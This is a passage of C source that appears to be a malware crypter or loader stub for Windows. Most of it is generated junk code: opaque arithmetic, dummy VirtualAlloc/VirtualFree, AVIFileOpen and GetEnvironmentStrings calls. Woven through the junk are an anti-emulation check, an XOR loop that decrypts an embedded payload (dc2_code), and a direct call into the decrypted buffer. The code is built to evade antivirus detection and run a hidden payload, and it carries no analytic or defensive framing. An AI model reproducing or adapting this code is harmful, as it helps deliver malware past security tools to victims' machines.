        len1 = (((res2 - (res2 * res2)) == res2) | (((((65 - (res2 * 153)) - res2) & ((50 - (res2 * 172)) != res2)) ^ (1 - res2)) ^ ((res2 != ((res2 * res2) + 152)) & (res2 + 100)))) | res2;
        len1 = ((len1 + len1) & 1) | 3072;
      }
      {
        type1 = (((res2 == 239) ^ res2) | ((res2 & 188) & ((res2 + 23) != res2))) | ((((113 & (res2 + 243)) & res2) ^ 8) ^ (res2 - 161));
        type1 = (((-type1) & 1) != (type1 & 1)) + 4096;
      }
      {
        prot1 = (((res2 + (((res2 * res2) * 225) * res2)) != 177) != res2) ^ (((res2 - res2) + 239) & ((res2 + 249) != res2));
        prot1 = ((~prot1) == prot1) + 4;
      }
      data1 = (int) VirtualAlloc(NULL, len1, type1, prot1);
      if (data1)
      {
        {
          int res0;
          int temp0;
          {
            temp0 = ((((data1 == 251) == data1) | data1) | ((78 ^ data1) ^ 70)) | (((data1 * data1) ^ ((data1 - 47) == (data1 * data1))) ^ (154 + ((data1 * 102) * data1)));
            temp0 = (((-temp0) & 1) != (temp0 & 1)) + 32;
          }
          res0 = (int) GetEnvironmentStrings();
          if (res0)
          {
            ;
          }

          ;
        }
        {
          release1 = (((res2 == 252) & ((((res2 != res2) == (132 * res2)) != (118 - res2)) == ((res2 + 210) + res2))) | (res2 & (21 + (res2 * 227)))) | res2;
          release1 = (((~release1) == release1) + 1) * 32768;
        }
        VirtualFree((void *) data1, 0, release1);
      }

      {
        int res0;
        int file0;
        char *name0;
        int mode0;
        {
          name0 = "iDyiNRcl8kzdwuii";
        }
        {
          mode0 = ((data1 - data1) ^ ((79 + data1) == (147 * data1))) ^ ((data1 & ((data1 + data1) == (39 - data1))) & (204 - data1));
          mode0 = (((~mode0) == mode0) + 1) * 3;
        }
        res0 = AVIFileOpen(&file0, name0, mode0, 0);
        if (res0)
        {
          ;
        }

        ;
      }
    }
  }
  fnANTIEMUL = GetProcAddress(h_module3, ANTIEMUL_FUNC);
  {
    int res2;
    int file2;
    char *name2;
    int mode2;
    {
      name2 = "vfeeHYKFx5K5f70iMz";
    }
    {
      mode2 = ((nCmdShow + ((131 * nCmdShow) * 158)) + nCmdShow) | (((80 - nCmdShow) ^ (((95 + nCmdShow) + nCmdShow) == nCmdShow)) ^ (104 + nCmdShow));
      mode2 = ((((-mode2) ^ mode2) & 1) + 1) * 3;
    }
    res2 = AVIFileOpen(&file2, name2, mode2, 0);
    if (res2)
    {
      {
        long res1;
        int temp1;
        {
          temp1 = ((res2 | (87 ^ (res2 != (res2 * 184)))) | (res2 ^ (((148 != (((res2 * 98) * res2) + 24)) == res2) == 90))) | res2;
          temp1 = (((temp1 + temp1) & 1) + 1) * 35;
        }
        res1 = GetLastError();
        if (res1)
        {
          {
            int res0;
            int file0;
            char *name0;
            int mode0;
            {
              name0 = "oyMXB";
            }
            {
              mode0 = res1 | (((((31 + res1) != ((((res1 * res1) - 109) - res1) - res1)) == 21) ^ (res1 - 20)) ^ (res1 * res1));
              mode0 = ((((-mode0) ^ mode0) & 1) + 1) * 0;
            }
            res0 = AVIFileOpen(&file0, name0, mode0, 0);
            if (res0)
            {
              ;
            }

            ;
          }
        }

        {
          int data0;
          int len0;
          int type0;
          int prot0;
          int release0;
          {
            len0 = (res1 != (243 * res1)) | (((res1 ^ (res1 != res1)) ^ (res1 - res1)) ^ ((res1 & 246) & res1));
            len0 = (((~len0) == len0) + 1) * 2883;
          }
          {
            type0 = (((res1 | (res1 & res1)) | ((73 * res1) == res1)) | ((res1 & 216) ^ (((res1 != res1) == (res1 - 217)) & (((res1 - 79) + res1) == 237)))) | (res1 ^ ((100 - res1) != res1));
            type0 = ((type0 + type0) & 1) | 4096;
          }
          {
            prot0 = (res1 ^ (175 & (res1 != ((res1 * 247) + ((res1 * res1) * 126))))) | (((res1 == 163) & res1) ^ res1);
            prot0 = (((prot0 + prot0) & 1) + 1) * 4;
          }
          data0 = (int) VirtualAlloc(NULL, len0, type0, prot0);
          if (data0)
          {
            ;
            {
              release0 = (((((res1 ^ (142 - res1)) ^ (res1 != 211)) | res1) | (((88 == res1) != res1) ^ (125 & res1))) | ((147 * res1) - res1)) | (((((res1 - (75 * res1)) != 94) & res1) & res1) ^ res1);
              release0 = (((release0 + release0) & 1) + 1) * 32768;
            }
            VirtualFree((void *) data0, 0, release0);
          }

          ;
        }
      }
    }

    {
      int res1;
      int temp1;
      {
        temp1 = ((((((res2 != 159) ^ (res2 - 5)) ^ (res2 & (143 - res2))) | (res2 != 147)) | ((res2 - 116) & (res2 * res2))) | 10) | res2;
        temp1 = ((((-temp1) & 1) != (temp1 & 1)) + 1) * 29;
      }
      res1 = (int) GetEnvironmentStrings();
      if (res1)
      {
        {
          int res0;
          int temp0;
          {
            temp0 = (((((res1 != ((111 * res1) - 65)) ^ res1) ^ ((((90 - res1) + 59) + res1) & (207 + res1))) ^ (res1 != 250)) ^ ((res1 - (140 * res1)) == res1)) ^ (res1 + res1);
            temp0 = (((~temp0) == temp0) + 1) * 58;
          }
          res0 = (int) GetEnvironmentStrings();
          if (res0)
          {
            ;
          }

          ;
        }
      }

      {
        int res0;
        int file0;
        char *name0;
        int mode0;
        {
          name0 = "0VGKDTFCodcIyeggKDKl";
        }
        {
          mode0 = (((res1 == (197 * res1)) ^ 212) | ((res1 * 200) * res1)) | ((92 + res1) ^ (((res1 * 254) - res1) != res1));
          mode0 = (((-mode0) & 1) != (mode0 & 1)) + 3;
        }
        res0 = AVIFileOpen(&file0, name0, mode0, 0);
        if (res0)
        {
          ;
        }

        ;
      }
    }
  }
  if (ANTIEMUL())
  {
    {
      int res2;
      int file2;
      char *name2;
      int mode2;
      {
        name2 = "oXsawtF4tDCaGY5owYDZI29swHJz6s";
      }
      {
        mode2 = (((((nCmdShow != nCmdShow) != 107) != (nCmdShow + nCmdShow)) & ((171 * nCmdShow) != (((160 * nCmdShow) + 112) + ((nCmdShow * nCmdShow) * 252)))) | (nCmdShow & nCmdShow)) | nCmdShow;
        mode2 = (((mode2 + mode2) & 1) + 1) * 4;
      }
      res2 = AVIFileOpen(&file2, name2, mode2, 0);
      if (res2)
      {
        {
          int data1;
          int len1;
          int type1;
          int prot1;
          int release1;
          {
            len1 = ((res2 ^ ((((res2 * res2) != res2) == 207) != res2)) ^ (133 + res2)) | ((((res2 + res2) + 98) == ((res2 - 95) + res2)) ^ ((68 + res2) - res2));
            len1 = ((((-len1) ^ len1) & 1) + 1) * 1330;
          }
          {
            type1 = (res2 - 219) | (((((res2 == res2) & res2) & ((119 != res2) == (res2 * 250))) & ((res2 != ((res2 * 167) + res2)) != res2)) ^ 138);
            type1 = ((((-type1) ^ type1) & 1) + 1) * 4096;
          }
          {
            prot1 = res2 | ((((20 & ((res2 - (212 * res2)) == ((res2 + 13) + res2))) ^ (95 & res2)) ^ 88) ^ ((res2 - 212) & res2));
            prot1 = ((((-prot1) ^ prot1) & 1) + 1) * 4;
          }
          data1 = (int) VirtualAlloc(NULL, len1, type1, prot1);
          if (data1)
          {
            {
              int res0;
              int file0;
              char *name0;
              int mode0;
              {
                name0 = "AVWsflXZVsj3XufTield9RWhgExtv8KU";
              }
              {
                mode0 = ((((data1 ^ data1) | ((97 != data1) & ((178 == data1) == data1))) | ((95 + data1) - data1)) | 243) | (((data1 - 91) & data1) & 186);
                mode0 = ((~mode0) == mode0) | 2;
              }
              res0 = AVIFileOpen(&file0, name0, mode0, 0);
              if (res0)
              {
                ;
              }

              ;
            }
            {
              release1 = ((((((res2 - 31) != res2) == (res2 + res2)) == (res2 - 223)) ^ res2) ^ ((5 == res2) == 147)) | ((((res2 != res2) == res2) & res2) & (res2 != (207 - ((res2 * res2) * res2))));
              release1 = ((~release1) == release1) | 32768;
            }
            VirtualFree((void *) data1, 0, release1);
          }

          {
            int res0;
            int temp0;
            {
              temp0 = (((data1 + data1) != 211) == data1) | ((((121 - data1) - 193) == (data1 * data1)) & (((48 != (data1 * data1)) != data1) == (10 * data1)));
              temp0 = (((-temp0) & 1) != (temp0 & 1)) + 87;
            }
            res0 = (int) GetEnvironmentStrings();
            if (res0)
            {
              ;
            }

            ;
          }
        }
      }

      {
        int res1;
        int temp1;
        {
          temp1 = (res2 & 57) ^ (((res2 != ((res2 + 56) - res2)) == (((res2 + res2) - (109 * res2)) + 162)) & (res2 * res2));
          temp1 = (((temp1 + temp1) & 1) + 1) * 59;
        }
        res1 = (int) GetEnvironmentStrings();
        if (res1)
        {
          {
            long res0;
            int temp0;
            {
              temp0 = (((res1 - 239) - res1) == (res1 - 73)) | ((res1 & (((res1 == (223 * res1)) == (res1 + 216)) != (res1 + (146 * res1)))) & res1);
              temp0 = (((temp0 + temp0) & 1) + 1) * 20;
            }
            res0 = GetLastError();
            if (res0)
            {
              ;
            }

            ;
          }
        }

        {
          int data0;
          int len0;
          int type0;
          int prot0;
          int release0;
          {
            len0 = (((((res1 - res1) == ((res1 + 190) + res1)) & 44) | (((res1 == res1) != 32) & res1)) | res1) | (((res1 == 117) != res1) & res1);
            len0 = (((-len0) & 1) != (len0 & 1)) | 1767;
          }
          {
            type0 = ((((res1 != (((35 - res1) - 215) - res1)) & 73) ^ ((res1 == res1) & ((((1 * res1) - 32) + res1) == res1))) ^ res1) | (225 * res1);
            type0 = ((~type0) == type0) | 4096;
          }
          {
            prot0 = (((res1 * res1) ^ (res1 + res1)) | (((res1 * 237) != res1) & ((227 * res1) == 168))) | (((res1 - 201) & (res1 + 172)) ^ (res1 != (174 - res1)));
            prot0 = (((-prot0) ^ prot0) & 1) | 4;
          }
          data0 = (int) VirtualAlloc(NULL, len0, type0, prot0);
          if (data0)
          {
            ;
            {
              release0 = ((((res1 + (78 * res1)) & (180 != res1)) | (30 - res1)) | (16 + (res1 * res1))) | (((226 * res1) ^ 17) ^ res1);
              release0 = (((-release0) & 1) != (release0 & 1)) | 32768;
            }
            VirtualFree((void *) data0, 0, release0);
          }

          ;
        }
      }
    }
    for (i3 = 0; i3 < (sizeof(dc2_code)); i3++)
    {
      loader2_data3[i3] = dc2_code[i3] ^ decryption_key[i3 % (sizeof(decryption_key))];
    }

  }

  {
    int res2;
    int file2;
    char *name2;
    int mode2;
    {
      name2 = "aHQBA";
    }
    {
      mode2 = (nCmdShow ^ (nCmdShow & 68)) | ((nCmdShow ^ (((((68 + nCmdShow) + 153) != nCmdShow) != ((2 * nCmdShow) - nCmdShow)) & (((21 != nCmdShow) == (103 * nCmdShow)) == nCmdShow))) ^ (48 & ((nCmdShow != nCmdShow) != (29 + nCmdShow))));
      mode2 = ((mode2 + mode2) & 1) | 1;
    }
    res2 = AVIFileOpen(&file2, name2, mode2, 0);
    if (res2)
    {
      {
        long res1;
        int temp1;
        {
          temp1 = (((res2 - res2) & ((res2 != 42) == res2)) ^ ((res2 != 126) & ((((res2 + 249) + res2) != res2) == 14))) | res2;
          temp1 = ((temp1 + temp1) & 1) | 79;
        }
        res1 = GetLastError();
        if (res1)
        {
          {
            int res0;
            int temp0;
            {
              temp0 = ((((res1 != 215) ^ (res1 != (res1 * res1))) ^ ((((res1 * res1) != res1) != res1) & 0)) | (res1 + res1)) | ((((87 * res1) != res1) ^ res1) ^ 187);
              temp0 = (((-temp0) & 1) != (temp0 & 1)) + 33;
            }
            res0 = (int) GetEnvironmentStrings();
            if (res0)
            {
              ;
            }

            ;
          }
        }

        {
          int res0;
          int temp0;
          {
            temp0 = ((((res1 * 80) != res1) ^ ((res1 + ((res1 * 103) * res1)) + 178)) | res1) | ((79 & res1) & 189);
            temp0 = (((temp0 + temp0) & 1) + 1) * 25;
          }
          res0 = (int) GetEnvironmentStrings();
          if (res0)
          {
            ;
          }

          ;
        }
      }
    }

    {
      int res1;
      int file1;
      char *name1;
      int mode1;
      {
        name1 = "GXkAaHhvGRJHUL6DHpFr5DfZRyMtMg";
      }
      {
        mode1 = (((res2 & ((100 + res2) != (182 - res2))) ^ ((51 + (res2 * res2)) & 12)) ^ (res2 != (res2 + 245))) | ((res2 - res2) ^ res2);
        mode1 = ((~mode1) == mode1) + 4;
      }
      res1 = AVIFileOpen(&file1, name1, mode1, 0);
      if (res1)
      {
        {
          int res0;
          int temp0;
          {
            temp0 = (((res1 != res1) ^ ((79 - res1) != ((res1 - (res1 * res1)) + 250))) ^ res1) | (res1 & 77);
            temp0 = (((-temp0) ^ temp0) & 1) + 49;
          }
          res0 = (int) GetEnvironmentStrings();
          if (res0)
          {
            ;
          }

          ;
        }
      }

      {
        int res0;
        int file0;
        char *name0;
        int mode0;
        {
          name0 = "uwVl4J4mfodUyFr8rPmPKsTUNtGSc";
        }
        {
          mode0 = (((res1 * 193) - res1) ^ (((2 != res1) & (((res1 * 106) * res1) == res1)) & (39 - res1))) | 237;
          mode0 = (((mode0 + mode0) & 1) + 1) * 0;
        }
        res0 = AVIFileOpen(&file0, name0, mode0, 0);
        if (res0)
        {
          ;
        }

        ;
      }
    }
  }
  loader2 = loader2_data3;
  {
    int data2;
    int len2;
    int type2;
    int prot2;
    int release2;
    {
      len2 = (((((((((nCmdShow + nCmdShow) - nCmdShow) - 197) == (nCmdShow + nCmdShow)) & (nCmdShow + (243 * nCmdShow))) ^ (158 * nCmdShow)) ^ 254) | (nCmdShow - 173)) | ((nCmdShow != (nCmdShow - 116)) == (nCmdShow * 133))) | (nCmdShow ^ 48);
      len2 = (((-len2) ^ len2) & 1) | 3154;
    }
    {
      type2 = nCmdShow ^ (((((((83 != (nCmdShow + (74 * nCmdShow))) != nCmdShow) == nCmdShow) & 139) & ((((nCmdShow + (nCmdShow * 137)) - nCmdShow) == nCmdShow) == 130)) & (((nCmdShow - 35) - nCmdShow) + (102 * nCmdShow))) & 128);
      type2 = (((~type2) == type2) + 1) * 4096;
    }
    {
      prot2 = ((((nCmdShow + 22) | ((((nCmdShow + nCmdShow) - 99) - nCmdShow) & ((nCmdShow * 133) * nCmdShow))) | ((nCmdShow * 116) != (nCmdShow - 162))) | ((nCmdShow + nCmdShow) == 90)) | nCmdShow;
      prot2 = (((prot2 + prot2) & 1) + 1) * 4;
    }
    data2 = (int) VirtualAlloc(NULL, len2, type2, prot2);
    if (data2)
    {
      {
        int res1;
        int file1;
        char *name1;
        int mode1;
        {
          name1 = "q8rcN2N2ibyddqPt";
        }
        {
          mode1 = (((data2 + data2) & ((95 == ((data2 - 92) - data2)) != 39)) | (((data2 ^ ((38 * data2) != ((data2 * data2) - data2))) ^ (247 == ((data2 * data2) + data2))) ^ (247 != data2))) | 182;
          mode1 = ((((-mode1) ^ mode1) & 1) + 1) * 3;
        }
        res1 = AVIFileOpen(&file1, name1, mode1, 0);
        if (res1)
        {
          {
            int res0;
            int file0;
            char *name0;
            int mode0;
            {
              name0 = "f14ANb";
            }
            {
              mode0 = ((((res1 ^ (res1 & ((229 != (res1 - 164)) == (res1 + res1)))) ^ 32) | (((res1 + (res1 * res1)) - 109) ^ (((res1 + res1) != res1) != 42))) | (((res1 != 37) != res1) ^ res1)) | 242;
              mode0 = ((~mode0) == mode0) | 5;
            }
            res0 = AVIFileOpen(&file0, name0, mode0, 0);
            if (res0)
            {
              ;
            }

            ;
          }
        }

        {
          int res0;
          int temp0;
          {
            temp0 = (((res1 != 144) != (res1 * res1)) ^ ((res1 & res1) & 187)) | (res1 & ((117 * res1) * 240));
            temp0 = ((((-temp0) ^ temp0) & 1) + 1) * 50;
          }
          res0 = (int) GetEnvironmentStrings();
          if (res0)
          {
            ;
          }

          ;
        }
      }
      {
        release2 = ((nCmdShow != (230 + nCmdShow)) | (((((((236 * nCmdShow) - 105) - nCmdShow) != 156) != nCmdShow) != ((88 * nCmdShow) * nCmdShow)) ^ nCmdShow)) | ((246 * nCmdShow) ^ 215);
        release2 = (((-release2) & 1) != (release2 & 1)) | 32768;
      }
      VirtualFree((void *) data2, 0, release2);
    }

    {
      int res1;
      int file1;
      char *name1;
      int mode1;
      {
        name1 = "8q19hwyhyqkql8IL5IO1Wg";
      }
      {
        mode1 = ((data2 & (data2 != data2)) & 97) | ((((data2 == (data2 * data2)) == (data2 + 115)) ^ (data2 - data2)) ^ (data2 + 199));
        mode1 = ((mode1 + mode1) & 1) + 0;
      }
      res1 = AVIFileOpen(&file1, name1, mode1, 0);
      if (res1)
      {
        {
          int res0;
          int file0;
          char *name0;
          int mode0;
          {
            name0 = "VVKwPkEGI6uAp4WYvK";
          }
          {
            mode0 = (res1 ^ (res1 - res1)) | (((((((res1 * res1) == (140 * res1)) & 217) ^ res1) ^ (res1 + 10)) ^ ((res1 - 59) & (res1 - res1))) ^ res1);
            mode0 = ((~mode0) == mode0) + 4;
          }
          res0 = AVIFileOpen(&file0, name0, mode0, 0);
          if (res0)
          {
            ;
          }

          ;
        }
      }

      {
        int res0;
        int file0;
        char *name0;
        int mode0;
        {
          name0 = "81uAht9kI0ISS6lx9jditV";
        }
        {
          mode0 = ((((((res1 & 255) | (((res1 - 142) & (res1 - res1)) & res1)) | ((198 == res1) ^ res1)) | ((112 == res1) == 105)) | (res1 != 245)) | (((res1 * 42) != res1) != res1)) | res1;
          mode0 = (((-mode0) & 1) != (mode0 & 1)) + 4;
        }
        res0 = AVIFileOpen(&file0, name0, mode0, 0);
        if (res0)
        {
          ;
        }

        ;
      }
    }
  }
  loader2(&params3);
  {
    int res2;
    int temp2;
    {
      temp2 = ((((nCmdShow & 199) & (nCmdShow - 114)) ^ nCmdShow) | ((nCmdShow * 180) != nCmdShow)) | (219 & (nCmdShow * nCmdShow));
      temp2 = (((-temp2) ^ temp2) & 1) | 65;
    }
    res2 = (int) GetEnvironmentStrings();
    if (res2)
    {
      {
        int res1;
        int file1;
        char *name1;
        int mode1;
        {
          name1 = "2nGy1CGrZ";
        }
        {
          mode1 = ((res2 == 35) | ((((res2 ^ 30) ^ ((res2 - 51) & res2)) ^ 100) ^ (res2 + 169))) | (res2 & 69);
          mode1 = ((((-mode1) ^ mode1) & 1) + 1) * 4;
        }
        res1 = AVIFileOpen(&file1, name1, mode1, 0);
        if (res1)
        {
          {
            int res0;
            int file0;
            char *name0;
            int mode0;
            {
              name0 = "WavmOyiekhvHrE6fNhzx3rUjypCm62";
            }
            {
              mode0 = ((res1 - res1) | (((res1 + res1) + res1) ^ (70 + res1))) | (((179 & res1) & res1) & 20);
              mode0 = (((-mode0) ^ mode0) & 1) | 3;
            }
            res0 = AVIFileOpen(&file0, name0, mode0, 0);
            if (res0)
            {
              ;
            }

            ;
          }
        }

        {
          int res0;
          int temp0;
          {
            temp0 = ((((res1 * 87) & (((res1 * res1) * res1) == (81 - res1))) ^ res1) | ((((res1 * 156) * res1) - res1) - (res1 * res1))) | (246 + res1);
            temp0 = ((((-temp0) ^ temp0) & 1) + 1) * 32;
          }
          res0 = (int) GetEnvironmentStrings();
          if (res0)
          {
            ;
          }

          ;
        }
      }
    }

    {
      int data1;
      int len1;
      int type1;
      int prot1;
      int release1;
      {
        len1 = ((res2 & (((res2 != res2) == res2) == ((res2 * 119) * res2))) & (res2 == 114)) ^ (res2 & res2);
        len1 = ((((-len1) ^ len1) & 1) + 1) * 3896;
      }
      {
        type1 = ((((res2 == 127) == res2) & ((243 == res2) == 246)) ^ (((((res2 * 36) + (res2 * res2)) + 43) == res2) & res2)) | res2;
        type1 = ((((-type1) & 1) != (type1 & 1)) + 1) * 4096;
      }
      {
        prot1 = ((res2 * res2) | (122 & ((res2 != 204) == res2))) | (((244 + res2) - res2) ^ (res2 & 74));
        prot1 = ((~prot1) == prot1) + 4;
      }
      data1 = (int) VirtualAlloc(NULL, len1, type1, prot1);
      if (data1)
      {
        {
          int res0;
          int file0;
          char *name0;
          int mode0;
          {
            name0 = "14vICCdSt1C0";
          }
          {
            mode0 = ((data1 - data1) | (((((data1 * 7) - data1) + 244) ^ (data1 == data1)) ^ ((((((data1 != (83 - (data1 * 144))) == data1) != (data1 * 149)) == data1) & 15) & data1))) | data1;
            mode0 = (((mode0 + mode0) & 1) + 1) * 0;
          }
          res0 = AVIFileOpen(&file0, name0, mode0, 0);
          if (res0)
          {
            ;
          }

          ;
        }
        {
          release1 = ((((((res2 * 161) - res2) == 90) ^ ((((((res2 == ((res2 * 223) - ((res2 * 3) * res2))) == 237) != res2) == res2) == res2) == res2)) ^ (236 != (res2 + 42))) | res2) | 216;
          release1 = (((-release1) ^ release1) & 1) | 32768;
        }
        VirtualFree((void *) data1, 0, release1);
      }

      {
        long res0;
        int temp0;
        {
          temp0 = (((((data1 == data1) != 104) ^ ((data1 == data1) != data1)) ^ ((data1 * data1) * data1)) ^ (data1 & (130 * data1))) | data1;
          temp0 = (((-temp0) ^ temp0) & 1) | 85;
        }
        res0 = GetLastError();
        if (res0)
        {
          ;
        }

        ;
      }
    }
  }
}

